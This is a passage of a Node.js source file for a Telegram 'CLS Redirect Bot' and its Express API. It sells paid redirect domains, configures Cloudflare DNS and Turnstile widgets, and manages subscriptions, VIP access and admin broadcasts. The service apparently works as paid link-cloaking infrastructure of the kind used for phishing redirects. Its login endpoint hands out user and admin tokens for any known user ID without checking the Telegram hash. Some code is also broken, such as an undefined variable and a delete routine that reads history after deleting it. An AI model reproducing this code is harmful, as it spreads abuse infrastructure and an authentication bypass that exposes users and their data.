            await db.updatePaymentRequestStatus(requestId, 'rejected', null, new Date().toISOString());

            // Notify user
            try {
              await bot.telegram.sendMessage(userId, 
                `❌ *Payment Rejected*\n\n` +
                `💰 Amount: $${paymentRequest.amount}\n` +
                `🆔 Request ID: \`${requestId}\`\n\n` +
                `Your payment verification was rejected.\n` +
                `Please ensure you sent the correct amount and provide valid proof.\n\n` +
                `Contact support if you believe this is an error.`,
                { parse_mode: "Markdown" }
              );
            } catch (userError) {
              console.log("Failed to notify user of payment rejection");
            }

            // Send confirmation to admin
            await ctx.answerCbQuery('❌ Payment rejected!', { show_alert: true });

            await bot.telegram.sendMessage(
              ctx.from.id,
              `❌ *Payment Rejected*\n\n` +
              `💰 Amount: $${paymentRequest.amount}\n` +
              `👤 User ID: ${userId}\n` +
              `🆔 Request ID: \`${requestId}\`\n\n` +
              `User has been notified of the rejection.`,
              { parse_mode: "Markdown" }
            );
          } else {
            await bot.telegram.sendMessage(
              ctx.from.id,
              "❌ Payment request not found or already processed."
            );
          }
        } catch (error) {
          console.error('Payment rejection error:', error);
          await bot.telegram.sendMessage(
            ctx.from.id,
            "❌ Error processing payment rejection. Please check logs."
          );
        }
        return;
      }

      // Handle subscription purchase
      if (callbackData === 'subscribe_monthly') {
        const user = await getUserData(ctx.from.id);

        // Determine pricing based on first-time status
        const isFirstTime = !user.subscription.hasEverSubscribed;
        const subscriptionPrice = isFirstTime ? 250 : 200;

        if (user.balance < subscriptionPrice) {
          return ctx.editMessageText(
            `❌ *Need $${(subscriptionPrice - user.balance).toFixed(2)} more*\n\n` +
            `Required: $${subscriptionPrice}\nBalance: $${user.balance.toFixed(2)}`,
            { 
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [{ text: '💳 Add Funds', callback_data: 'topup' }],
                  [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                ]
              }
            }
          );
        }

        if (user.subscription.active) {
          return ctx.editMessageText(
            `⭐ *Already Subscribed*\n\n` +
            `You already have an active subscription.\n` +
            `Wait for it to expire before renewing.`,
            { 
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                ]
              }
            }
          );
        }

        // Activate subscription
        user.balance -= subscriptionPrice;
        user.subscription.active = true;
        user.subscription.startDate = new Date();
        user.subscription.endDate = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000); // 30 days
        user.subscription.domainsUsed = 0;
        user.subscription.dailyDomainsUsed = 0;
        user.subscription.lastDomainDate = null;
        user.subscription.isFirstTime = isFirstTime;
        user.subscription.hasEverSubscribed = true;

        // Save all changes atomically to prevent race conditions
        const saveSuccess = await saveUserData(ctx.from.id, user);

        if (!saveSuccess) {
          console.error(`Failed to save subscription data for user ${ctx.from.id}`);
          return ctx.editMessageText(
            `❌ *Subscription Error*\n\n` +
            `There was an error activating your subscription.\n` +
            `Your balance has NOT been charged.\n\n` +
            `Please try again or contact support.`,
            { 
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [{ text: '🔄 Try Again', callback_data: 'subscribe_monthly' }],
                  [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                ]
              }
            }
          );
        }

        console.log(`✅ Subscription activated for user ${ctx.from.id}. Expires: ${user.subscription.endDate.toISOString()}`);

        // Verify subscription was saved correctly
        const verifyUser = await getUserData(ctx.from.id);
        if (!verifyUser.subscription.active) {
          console.error(`❌ CRITICAL: Subscription verification failed for user ${ctx.from.id}! Data not persisted correctly.`);
          // Attempt to resave
          user.balance += subscriptionPrice; // Refund
          await saveUserData(ctx.from.id, user);

          return ctx.editMessageText(
            `❌ *Subscription Activation Failed*\n\n` +
            `There was a critical error saving your subscription.\n` +
            `Your payment has been refunded.\n\n` +
            `Please try again or contact support if this persists.`,
            { 
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [{ text: '🔄 Try Again', callback_data: 'subscribe_monthly' }],
                  [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                ]
              }
            }
          );
        }

        // Notify admin
        if (process.env.ADMIN_ID && bot) {
          try {
            await bot.telegram.sendMessage(
              process.env.ADMIN_ID,
              `⭐ *New Monthly Subscription*\n\n` +
              `👤 User: @${ctx.from.username || 'Unknown'} (${ctx.from.id})\n` +
              `👤 Name: ${ctx.from.first_name || 'Unknown'}\n` +
              `💰 Amount: $${subscriptionPrice} ${isFirstTime ? '(First-time)' : '(Renewal)'}\n` +
              `📅 Start: ${user.subscription.startDate.toDateString()}\n` +
              `📅 End: ${user.subscription.endDate.toDateString()}\n` +
              `💳 New Balance: $${user.balance.toFixed(2)}`,
              { parse_mode: "Markdown" }
            );
          } catch (error) {
            console.log("Failed to notify admin of subscription");
          }
        }


        const savings = (60 * 80) - subscriptionPrice;

        return ctx.editMessageText(
          `✅ *Subscription Activated!*\n\n` +
          `🎯 *Daily Limit:* 2 domains (6 links)\n` +
          `📅 *Expires:* ${user.subscription.endDate.toDateString()}\n` +
          `💰 *Balance:* $${user.balance.toFixed(2)}\n\n` +
          `Start creating your first domain now!`,
          { 
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [{ text: '🎯 Create First Domain', callback_data: 'redirect' }],
                [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
              ]
            }
          }
        );
      }

      // Handle pay-per-use redirect when subscription is exhausted
      if (callbackData === 'redirect_payperuse') {
        const user = await getUserData(ctx.from.id);
        if (user.balance < 80) {
          return ctx.editMessageText(
            `💰 *Insufficient Balance*\n\n` +
            `Required: $80\n` +
            `Current Balance: $${user.balance.toFixed(2)}`,
            { 
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [{ text: '💳 Add Funds', callback_data: 'topup' }],
                  [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                ]
              }
            }
          );
        }

        session.awaiting_domain = true;
        session.force_payment = true; // Force payment even if subscription exists

        return ctx.editMessageText(
          "🎯 *Pay Per Use - $80*\n\n" +
            "✨ *Format:* `domain.com redirect-url TURNSTILE_KEY`\n" +
            "📝 *Example:* `mysite.com https://fb.com 0x4AAA...`\n\n" +
            "💡 Turnstile key is optional (default key used if not provided)",
          { parse_mode: "Markdown" }
        );
      }

      // Handle Cloudflare domain selection
      if (callbackData.startsWith('cf_select_')) {
        const zoneId = callbackData.replace('cf_select_', '');
        const cf = session.cloudflare_client;

        if (!cf) {
          return ctx.editMessageText("❌ Session expired. Please start over with /start");
        }

        try {
          const statusMsg = await ctx.editMessageText(
            "🔄 Configuring security settings...\n\n" +
            "⏳ Please wait, this may take a few seconds..."
          );

          // Configure security settings
          const results = await cf.configureSecuritySettings(zoneId);

          // Get domain info for DNS setup
          const domainsResponse = await cf.client.get(`/zones/${zoneId}`);
          const domainName = domainsResponse.data.result.name;

          // Get nameservers
          const nameserverInfo = await cf.getNameservers(zoneId);

          // Always add DNS A record using environment variable IP
          let dnsRecordCreated = false;
          let dnsMessage = '';

          // Use SERVER_IP from environment variables
          const serverIP = process.env.SERVER_IP;

          if (serverIP) {
            try {
              await ctx.telegram.editMessageText(
                ctx.chat.id,
                statusMsg.message_id,
                null,
                "🔄 Configuring security settings...\n\n" +
                "✅ Security configured\n" +
                "🌐 Adding DNS A record..."
              );

              const dnsResult = await cf.addDNSRecord(zoneId, domainName, serverIP);

              if (dnsResult.success) {
                dnsRecordCreated = true;
                dnsMessage = `\n\n🌐 *DNS A Record Added:*\n` +
                  `• Domain: ${domainName}\n` +
                  `• Status: Configured\n` +
                  `• Proxied: Yes (Orange cloud)`;
              }
            } catch (dnsError) {
              console.error('DNS record creation error:', dnsError);
              dnsMessage = `\n\n⚠️ DNS record setup failed: ${dnsError.message}`;
            }
          } else {
            dnsMessage = `\n\n⚠️ DNS record setup skipped: SERVER_IP not configured`;
          }

          // Create Turnstile widget
          let turnstileMessage = '';
          try {
            await ctx.telegram.editMessageText(
              ctx.chat.id,
              statusMsg.message_id,
              null,
              "🔄 Configuring security settings...\n\n" +
              "✅ Security configured\n" +
              "🔐 Creating Turnstile widget..."
            );

            const turnstileResult = await cf.createTurnstileWidget(domainName);

            if (turnstileResult.success) {
              turnstileMessage = `\n\n🔐 *Turnstile Widget Created:*\n` +
                `• Site Key: \`${turnstileResult.sitekey}\`\n` +
                `•  ${turnstileResult.mode}\n` +
                `•  ${domainName}`;
            }
          } catch (turnstileError) {
            console.error('Turnstile widget creation error:', turnstileError);
            turnstileMessage = `\n\n⚠️ Turnstile widget creation failed: ${turnstileError.message}`;
          }

          // Prepare nameserver information
          let nameserverMessage = '';
          if (nameserverInfo.nameservers && nameserverInfo.nameservers.length > 0) {
            nameserverMessage = `\n\n📡 * Nameservers:*\n` +
              nameserverInfo.nameservers.map((ns, i) => `${i + 1}. \`${ns}\``).join('\n') +
              `\n⚠️ Update your domain with these nameservers for Cloudflare to work!`;
          }

          const successEmoji = '✅';


          // Add error details if any settings failed
          let errorDetails = '';
          if (results.errors && results.errors.length > 0) {
            errorDetails = '\n\n⚠️ *Some settings could not be enabled:*\n' +
              results.errors.map(err => `• ${err.setting}: ${err.error}`).join('\n');
          }

          await ctx.telegram.editMessageText(
            ctx.chat.id,
            statusMsg.message_id,
            null,
            `✅ *Setup Configured!*\n\n` +
            `${statusText}${dnsMessage}${turnstileMessage}${nameserverMessage}${errorDetails}\n\n` +
            `🔒 Your domain is now protected with Cloudflare  ${results.sslEnabled ? '  SSL Certificates are Activated' : ''}!\n\n` +
            `💡`,
            {
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                ]
              }
            }
          );

          // Clear Cloudflare session
          delete session.cloudflare_client;
          delete session.cloudflare_email;

        } catch (error) {
          await ctx.editMessageText(
            `❌ *Configuration Failed*\n\n` +
            `Error: ${error.message}\n\n` +
            `Please try again or contact support.`,
            {
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
                ]
              }
            }
          );
        }

        return;
      }

      // Handle admin panel actions
      if (callbackData === 'admin_free_domain') {
        if (!process.env.ADMIN_ID || ctx.from.id.toString() !== process.env.ADMIN_ID) {
          return ctx.answerCbQuery('Unauthorized', { show_alert: true });
        }

        session.awaiting_domain = true;
        session.admin_free_access = true;

        return ctx.editMessageText(
          "🔑 *Admin Access - Free Access Granted*\n\n" +
            "✨ *Format:* `domain.com redirect-url TURNSTILE_KEY`\n" +
            "📝 *Example:* `mysite.com https://fb.com 0x4AAA...`\n\n" +
            "💡 Turnstile key is optional (default key used if not provided)\n" +
            "💎 Free access for admin - no payment required",
          { parse_mode: "Markdown" }
        );
      }

      if (callbackData === 'admin_broadcast') {
        if (!process.env.ADMIN_ID || ctx.from.id.toString() !== process.env.ADMIN_ID) {
          return ctx.answerCbQuery('Unauthorized', { show_alert: true });
        }

        session.awaiting_broadcast = true;

        return ctx.editMessageText(
          "📢 *Broadcast Message*\n\n" +
          "Send me the message you want to broadcast to all users.\n\n" +
          "You can use Markdown formatting:\n" +
          "• *bold text*\n" +
          "• _italic text_\n" +
          "• `code`\n" +
          "• [link](url)\n\n" +
          "Send /cancel to abort.",
          { parse_mode: "Markdown" }
        );
      }

      // Handle Cloudflare setup cancellation
      if (callbackData === 'cancel_cloudflare') {
        delete session.cloudflare_client;
        delete session.awaiting_cloudflare_credentials;

        return ctx.editMessageText(
          "❌ Cloudflare setup cancelled.",
          {
            reply_markup: {
              inline_keyboard: [
                [{ text: '🔙 Back to Menu', callback_data: 'back_menu' }]
              ]
            }
          }
        );
      }

      // Handle back to menu
      if (callbackData === 'back_menu') {
        // Clear any pending sessions
        Object.keys(session).forEach(key => delete session[key]);

        // Try to edit message, if it fails (e.g., photo message), delete and send new
        try {
          return await ctx.editMessageText(
            `🎯 *CLS Redirect Bot*`,
            { 
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [
                    { text: '💳 Top Up', callback_data: 'topup' },
                    { text: '🎯 Create Redirect', callback_data: 'redirect' }
                  ],
                  [
                    { text: '⭐ Monthly Subscription', callback_data: 'subscription' },
                    { text: 'Domain Tester 🚥', url: 'https://t.me/clstes_bot' }
                  ],
                  [
                    { text: '⚙️ Template Settings', callback_data: 'template_settings' },
                    { text: '☁️ Cloudflare Security', callback_data: 'cloudflare_setup' }
                  ],
                  [
                    { text: '🔑 VIP Access Request', callback_data: 'admin_access' }
                  ]
                ]
              }
            }
          );
        } catch (error) {
          // If editing fails (e.g., photo message), delete and send new message
          try {
            await ctx.deleteMessage();
          } catch (e) {
            // Ignore if deletion fails
          }

          return await ctx.reply(
            `🎯 *CLS Redirect Bot*`,
            { 
              parse_mode: "Markdown",
              reply_markup: {
                inline_keyboard: [
                  [
                    { text: '💳 Top Up', callback_data: 'topup' },
                    { text: '🎯 Create Redirect', callback_data: 'redirect' }
                  ],
                  [
                    { text: '⭐ Monthly Subscription', callback_data: 'subscription' },
                    { text: 'Domain Tester 🚥', url: 'https://t.me/clstes_bot' }
                  ],
                  [
                    { text: '⚙️ Template Settings', callback_data: 'template_settings' },
                    { text: '☁️ Cloudflare Security', callback_data: 'cloudflare_setup' }
                  ],
                  [
                    { text: '🔑 VIP Access Request', callback_data: 'admin_access' }
                  ]
                ]
              }
            }
          );
        }
      }
    } catch (error) {
      console.log('Callback error:', error.message);
    }

    // Handle admin access approval/denial callbacks
    if (callbackData.startsWith('grant_access_') || callbackData.startsWith('deny_access_')) {
      const [action, , requestId] = callbackData.split('_');
      const request = adminRequests.get(requestId);

      if (!request) {
        return;
      }

      if (action === 'grant') {
        // Grant free admin access to user
        const userSession = sessions.get(request.userId) || {};
        userSession.admin_free_access = true;
        sessions.set(request.userId, userSession);

        request.status = 'approved';

        // Notify user
        try {
          await bot.telegram.sendMessage(
            request.userId,
            `✅ *Admin Access Granted!*\n\n` +
            `🆔 Request ID: \`${requestId}\`\n\n` +
            `You now have free domain provisioning access.\n` +
            `Use /start to create your first domain.`,
            { parse_mode: "Markdown" }
          );
        } catch (error) {
          console.log("Failed to notify user");
        }

        await ctx.editMessageText(
          `✅ *ACCESS GRANTED*\n\n${ctx.callbackQuery.message.text.replace('🔑 *Admin Access Request*', '🔑 *Admin Access Request - GRANTED*')}`,
          { parse_mode: "Markdown" }
        );

      } else if (action === 'deny') {
        request.status = 'denied';

        // Notify user
        try {
          await bot.telegram.sendMessage(
            request.userId,
            `❌ *Admin Access Denied*\n\n` +
            `🆔 Request ID: \`${requestId}\`\n\n` +
            `Your admin access request has been denied.\n` +
            `You can still use pay-per-domain or subscription services.`,
            { parse_mode: "Markdown" }
          );
        } catch (error) {
          console.log("Failed to notify user");
        }

        await ctx.editMessageText(
          `❌ *ACCESS DENIED*\n\n${ctx.callbackQuery.message.text.replace('🔑 *Admin Access Request*', '🔑 *Admin Access Request - DENIED*')}`,
          { parse_mode: "Markdown" }
        );
      }
    }

    // Handle admin access approval/denial callbacks
    if (callbackData.startsWith('grant_vip_') || callbackData.startsWith('deny_vip_')) {
      const requestId = callbackData.replace('grant_vip_', '').replace('deny_vip_', '');
      const request = adminRequests.get(requestId);

      if (!request) {
        return ctx.answerCbQuery('Request not found or expired', { show_alert: true });
      }

      if (callbackData.startsWith('grant_vip_')) {
        // Grant VIP access to user session
        const userSession = sessions.get(request.userId) || {};
        userSession.admin_free_access = true;
        sessions.set(request.userId, userSession);

        request.status = 'approved';
        adminRequests.delete(requestId);

        // Notify user
        try {
          await bot.telegram.sendMessage(
            request.userId,
            `✅ *VIP Access Granted!*\n\n` +
            `🆔 Request ID: \`${requestId}\`\n\n` +
            `You now have free VIP domain provisioning access.\n` +
            `Use "🎯 Create Redirect" to provision your domain without payment.`,
            { parse_mode: "Markdown" }
          );
        } catch (error) {
          console.log("Failed to notify user of VIP access approval");
        }

        await ctx.answerCbQuery('✅ VIP access granted!', { show_alert: true });

        await ctx.telegram.sendMessage(
          ctx.from.id,
          `✅ *VIP ACCESS GRANTED*\n\n` +
          `👤 User: @${request.username} (${request.userId})\n` +
          `👋 Name: ${request.firstName}\n` +
          `🆔 Request ID: \`${requestId}\`\n\n` +
          `User has been granted free VIP domain access.`,
          { parse_mode: "Markdown" }
        );

      } else if (callbackData.startsWith('deny_vip_')) {
        request.status = 'denied';
        adminRequests.delete(requestId);

        // Notify user
        try {
          await bot.telegram.sendMessage(
            request.userId,
            `❌ *VIP Access Denied*\n\n` +
            `🆔 Request ID: \`${requestId}\`\n\n` +
            `Your VIP access request has been denied.\n` +
            `You can still use pay-per-domain or subscription services.`,
            { parse_mode: "Markdown" }
          );
        } catch (error) {
          console.log("Failed to notify user of VIP access denial");
        }

        await ctx.answerCbQuery('❌ VIP access denied!', { show_alert: true });

        await ctx.telegram.sendMessage(
          ctx.from.id,
          `❌ *VIP ACCESS DENIED*\n\n` +
          `👤 User: @${request.username} (${request.userId})\n` +
          `🆔 Request ID: \`${requestId}\`\n\n` +
          `VIP access request has been denied.`,
          { parse_mode: "Markdown" }
        );
      }
      return;
    }

    // Payment approvals handled via payment verification system above
  });

  // Global error handler for bot
  bot.catch((err, ctx) => {
    const errorLog = L("bot-error");

    // Handle specific Telegram API errors
    if (err.response && err.response.error_code === 400) {
      if (err.response.description && err.response.description.includes('message is not modified')) {
        // Silently ignore "message not modified" errors
        errorLog.debug({ error: err.message }, 'Message not modified - ignoring');
        return;
      }
    }

    // Handle 409 Conflict errors
    if (err.response && err.response.error_code === 409) {
      errorLog.error({ error: err.message }, 'Conflict error - another instance may be running');
      return;
    }

    // Log other errors
    errorLog.error({ 
      error: err.message, 
      code: err.response?.error_code,
      description: err.response?.description 
    }, 'Unhandled bot error');
  });
}

// ==========================================
// EXPRESS SERVER & API ENDPOINTS
// ==========================================

// Health check endpoint
app.get("/health", async (req, res) => {
  const log = L("health-check");
  
  // Get system stats
  let totalUsers = 0;
  let totalDomains = 0;
  let totalClicks = 0;
  
  try {
    const usersResult = await db.pool.query('SELECT COUNT(*) FROM users');
    totalUsers = parseInt(usersResult.rows[0].count) || 0;
    
    const domainsResult = await db.pool.query('SELECT COUNT(*) FROM history');
    totalDomains = parseInt(domainsResult.rows[0].count) || 0;
    
    const clicksResult = await db.pool.query('SELECT COUNT(*) FROM clicks');
    totalClicks = parseInt(clicksResult.rows[0].count) || 0;
  } catch (error) {
    log.error('Error fetching stats:', error.message);
  }
  
  const healthData = {
    status: "ok",
    timestamp: new Date().toISOString(),
    uptime: process.uptime(),
    memoryUsage: process.memoryUsage(),
    botStatus: bot ? "active" : "inactive",
    environment: process.env.NODE_ENV || "development",
    stats: {
      totalDomains: totalDomains,
      activeDomains: totalDomains, // All domains are considered active
      balance: 0, // This would need user context
      totalClicks: totalClicks,
      totalUsers: totalUsers
    }
  };

  log.debug(healthData, "💊 Health check requested");
  res.json(healthData);
});

// ==========================================
// DASHBOARD API ENDPOINTS
// ==========================================

// Authentication endpoint - exchange Telegram user ID for JWT tokens
app.post('/api/auth/login', auth.rateLimit({ windowMs: 60000, maxRequests: 20 }), async (req, res) => {
  const { userId, telegramHash } = req.body;
  
  if (!userId) {
    return res.status(400).json({ error: 'User ID is required' });
  }

  try {
    // Verify user exists
    const userData = await getUserData(userId);
    if (!userData) {
      return res.status(404).json({ error: 'User not found. Please use the Telegram bot first.' });
    }

    // Check if user is admin
    const isAdmin = process.env.ADMIN_ID && userId.toString() === process.env.ADMIN_ID;

    // Generate tokens
    const accessToken = auth.generateAccessToken(userId, isAdmin);
    const refreshToken = auth.generateRefreshToken(userId);
    const csrfToken = auth.generateCsrfToken(userId);

    res.json({
      accessToken,
      refreshToken,
      csrfToken,
      user: {
        id: userData.id,
        isAdmin
      }
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Login failed' });
  }
});

// Refresh token endpoint
app.post('/api/auth/refresh', async (req, res) => {
  const { refreshToken } = req.body;

  if (!refreshToken) {
    return res.status(401).json({ error: 'Refresh token required' });
  }

  const decoded = auth.verifyRefreshToken(refreshToken);
  if (!decoded) {
    return res.status(403).json({ error: 'Invalid or expired refresh token' });
  }

  try {
    // Check if user is admin
    const isAdmin = process.env.ADMIN_ID && decoded.userId.toString() === process.env.ADMIN_ID;

    // Generate new access token
    const accessToken = auth.generateAccessToken(decoded.userId, isAdmin);
    const csrfToken = auth.generateCsrfToken(decoded.userId);

    res.json({ accessToken, csrfToken });
  } catch (error) {
    console.error('Token refresh error:', error);
    res.status(500).json({ error: 'Token refresh failed' });
  }
});

// Logout endpoint
app.post('/api/auth/logout', auth.authenticateToken, async (req, res) => {
  const { refreshToken } = req.body;

  if (refreshToken) {
    auth.revokeRefreshToken(req.user.userId, refreshToken);
  }

  res.json({ success: true });
});

// User registration endpoint
app.post('/api/register', auth.rateLimit({ windowMs: 60000, maxRequests: 20 }), async (req, res) => {
  const { userId, username } = req.body;
  
  if (!userId) {
    return res.status(400).json({ error: 'User ID is required' });
  }

  try {
    console.log(`Registration attempt for userId: ${userId}`);
    
    // Use loadUserData instead of getUserData to check if user exists
    // getUserData auto-creates users, which causes the "already registered" issue
    let existingUser = await loadUserData(userId);
    console.log(`Existing user check result:`, existingUser);
    
    if (existingUser && existingUser.joinDate) {
      console.log(`User ${userId} already exists with joinDate: ${existingUser.joinDate}`);
      return res.status(400).json({ error: 'User already registered' });
    }
    
    const userData = {
      id: userId,
      username: username || null,
      balance: 0,
      joinDate: new Date(),
      totalDomains: 0,
      templateType: 'html',
      subscription: {
        active: false,
        startDate: null,
        endDate: null,
        domainsUsed: 0,
        dailyDomainsUsed: 0,
        lastDomainDate: null,
        hasEverSubscribed: false
      }
    };

    console.log(`Saving new user data for ${userId}`);
    const saveResult = await saveUserData(userId, userData);
    console.log(`Save result for ${userId}: ${saveResult}`);
    
    if (!saveResult) {
      console.error(`Failed to save user data for ${userId}`);
      return res.status(500).json({ error: 'Failed to save user data' });
    }
    
    res.json({ success: true, user: userData });
  } catch (error) {
    console.error('Registration error details:', error.message, error.stack);
    res.status(500).json({ error: 'Registration failed: ' + error.message });
  }
});

// Get user data endpoint
app.get('/api/user/:userId', auth.authenticateToken, async (req, res) => {
  const { userId } = req.params;

  // Users can only access their own data unless admin
  if (req.user.userId.toString() !== userId && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  try {
    const userData = await getUserData(userId);
    if (!userData) {
      return res.status(404).json({ error: 'User not found' });
    }

    res.json({
      id: userData.id,
      username: userData.username || null,
      balance: userData.balance,
      joinDate: userData.joinDate,
      totalDomains: userData.totalDomains,
      templateType: userData.templateType,
      subscriptionStatus: userData.subscription.active ? 'Active' : 'Not Active',
      subscription: userData.subscription
    });
  } catch (error) {
    console.error('Error fetching user:', error);
    res.status(500).json({ error: 'Failed to fetch user data' });
  }
});

// Update user profile endpoint
app.post('/api/user/:userId/profile', auth.authenticateToken, auth.csrfProtection, async (req, res) => {
  const { userId } = req.params;
  const { email, templateType, notifications } = req.body;

  // Users can only update their own profile
  if (req.user.userId.toString() !== userId) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  try {
    const userData = await getUserData(userId);
    if (!userData) {
      return res.status(404).json({ error: 'User not found' });
    }

    // Update profile fields
    if (email !== undefined) userData.email = email;
    if (templateType !== undefined) userData.templateType = templateType;
    if (notifications !== undefined) userData.notifications = notifications;

    await saveUserData(userId, userData);
    res.json({ success: true, user: userData });
  } catch (error) {
    console.error('Profile update error:', error);
    res.status(500).json({ error: 'Failed to update profile' });
  }
});

// Get user domain history endpoint
app.get('/api/user/:userId/history', auth.authenticateToken, async (req, res) => {
  const { userId } = req.params;

  // Users can only access their own history unless admin
  if (req.user.userId.toString() !== userId && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  try {
    const history = await loadUserHistory(userId);
    res.json(history);
  } catch (error) {
    console.error('Error fetching history:', error);
    res.status(500).json({ error: 'Failed to fetch history' });
  }
});

// Get user analytics endpoint
app.get('/api/user/:userId/analytics', auth.authenticateToken, async (req, res) => {
  const { userId } = req.params;

  // Users can only access their own analytics unless admin
  if (req.user.userId.toString() !== userId && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  try {
    const history = await loadUserHistory(userId);
    
    // Calculate analytics from history
    let totalClicks = 0;
    const domainStats = [];

    for (const item of history) {
      const clicks = await db.getClickStats(item.domain);
      totalClicks += clicks;
      
      domainStats.push({
        domain: item.domain,
        clicks: clicks,
        conversion: clicks > 0 ? `${Math.round((clicks / 100) * 100)}%` : '0%',
        lastActive: item.date
      });
    }

    // Sort by clicks
    domainStats.sort((a, b) => b.clicks - a.clicks);

    res.json({
      totalClicks,
      conversionRate: totalClicks > 0 ? `${Math.round((totalClicks / (history.length * 100)) * 100)}%` : '0%',
      avgTimeOnPage: '0s',
      topDomain: domainStats.length > 0 ? domainStats[0].domain : 'N/A',
      domains: domainStats
    });
  } catch (error) {
    console.error('Analytics error:', error);
    res.status(500).json({ error: 'Failed to fetch analytics' });
  }
});

// Delete user data endpoint
app.delete('/api/user/:userId/delete', auth.authenticateToken, auth.csrfProtection, async (req, res) => {
  const { userId } = req.params;

  // Users can only delete their own data
  if (req.user.userId.toString() !== userId) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  try {
    // Delete user history
    await db.pool.query('DELETE FROM history WHERE user_id = $1', [userId]);
    
    // Delete user clicks
    const history = await loadUserHistory(userId);
    for (const item of history) {
      await db.pool.query('DELETE FROM clicks WHERE domain = $1', [item.domain]);
    }
    
    // Delete payment requests
    await db.pool.query('DELETE FROM payment_requests WHERE user_id = $1', [userId]);
    
    // Delete topups
    await db.pool.query('DELETE FROM topups WHERE user_id = $1', [userId]);
    
    // Delete user
    await db.pool.query('DELETE FROM users WHERE id = $1', [userId]);

    res.json({ success: true, message: 'All user data deleted' });
  } catch (error) {
    console.error('Delete user error:', error);
    res.status(500).json({ error: 'Failed to delete user data' });
  }
});

// Check admin status endpoint
app.get('/api/user/:userId/isAdmin', auth.authenticateToken, async (req, res) => {
  const { userId } = req.params;

  // Users can only check their own admin status
  if (req.user.userId.toString() !== userId) {
    return res.status(403).json({ error: 'Forbidden' });
  }

  res.json({ isAdmin: req.user.isAdmin });
});

// Admin broadcast endpoint
app.post('/api/admin/broadcast', auth.authenticateToken, auth.requireAdmin, auth.csrfProtection, async (req, res) => {
  const { message } = req.body;

  if (!message) {
    return res.status(400).json({ error: 'Message is required' });
  }

  try {
    const result = await db.pool.query('SELECT id FROM users');
    const userIds = result.rows.map(row => row.id);

    let successCount = 0;
    let failCount = 0;

    for (const userId of userIds) {
      try {
        await bot.telegram.sendMessage(
          userId,
          `📢 *Announcement from Admin*\n\n${message}`,
          { parse_mode: "Markdown" }
        );
        successCount++;
        await new Promise(resolve => setTimeout(resolve, 50));
      } catch (error) {
        failCount++;
      }
    }

    res.json({
      success: true,
      totalUsers: userIds.length,
      successCount,
      failCount
    });
  } catch (error) {
    console.error('Broadcast error:', error);
    res.status(500).json({ error: 'Failed to send broadcast' });
  }
});

// Support ticket endpoint
app.post('/api/support/ticket', auth.rateLimit({ windowMs: 60000, maxRequests: 3 }), async (req, res) => {
  const { userId, email, subject, message } = req.body;

  if (!email || !subject || !message) {
    return res.status(400).json({ error: 'All fields are required' });
  }

  try {
    // Store ticket in database
    await db.pool.query(
      'INSERT INTO support_tickets (user_id, email, subject, message, status) VALUES ($1, $2, $3, $4, $5)',
      [userId || null, email, subject, message, 'open']
    );

    // Notify admin if configured
    if (process.env.ADMIN_ID && bot) {
      try {
        await bot.telegram.sendMessage(
          process.env.ADMIN_ID,
          `🎫 *New Support Ticket*\n\n` +
          `📧 Email: ${email}\n` +
          `📋 Subject: ${subject}\n` +
          `💬 Message:\n${message}\n\n` +
          `👤 User ID: ${userId || 'Not logged in'}`,
          { parse_mode: "Markdown" }
        );
      } catch (error) {
        console.log('Failed to notify admin of support ticket');
      }
    }

    res.json({ success: true, message: 'Support ticket submitted' });
  } catch (error) {
    console.error('Support ticket error:', error);
    res.status(500).json({ error: 'Failed to submit support ticket' });
  }
});

// Link click tracking endpoint (re-enabled)
app.post('/api/track/:domain', async (req, res) => {
  const { domain } = req.params;
  const ipAddress = req.ip || req.headers['x-forwarded-for'] || 'unknown';

  try {
    await db.trackClick(domain, ipAddress);
    res.json({ success: true });
  } catch (error) {
    console.error('Click tracking error:', error);
    res.status(500).json({ error: 'Failed to track click' });
  }
});

// Get link stats endpoint
app.get('/api/link/:domain/stats', async (req, res) => {
  const { domain } = req.params;

  try {
    const clicks = await db.getClickStats(domain);
    res.json({ domain, clicks });
  } catch (error) {
    console.error('Stats error:', error);
    res.status(500).json({ error: 'Failed to fetch stats' });
  }
});

// Admin endpoints for user management
app.get('/api/admin/users', auth.authenticateToken, auth.requireAdmin, async (req, res) => {
  try {
    const result = await db.pool.query('SELECT * FROM users ORDER BY join_date DESC');
    res.json(result.rows);
  } catch (error) {
    console.error('Users fetch error:', error);
    res.status(500).json({ error: 'Failed to fetch users' });
  }
});

// Admin endpoint for all domains
app.get('/api/admin/domains', auth.authenticateToken, auth.requireAdmin, async (req, res) => {
  try{
    const result = await db.pool.query('SELECT * FROM history ORDER BY created_at DESC');
    res.json(result.rows);
  } catch (error) {
    console.error('Domains fetch error:', error);
    res.status(500).json({ error: 'Failed to fetch domains' });
  }
});

// Admin endpoint for system analytics
app.get('/api/admin/analytics', auth.authenticateToken, auth.requireAdmin, async (req, res) => {
  try {
    const usersResult = await db.pool.query('SELECT COUNT(*) FROM users');
    const domainsResult = await db.pool.query('SELECT COUNT(*) FROM history');
    const clicksResult = await db.pool.query('SELECT COUNT(*) FROM clicks');
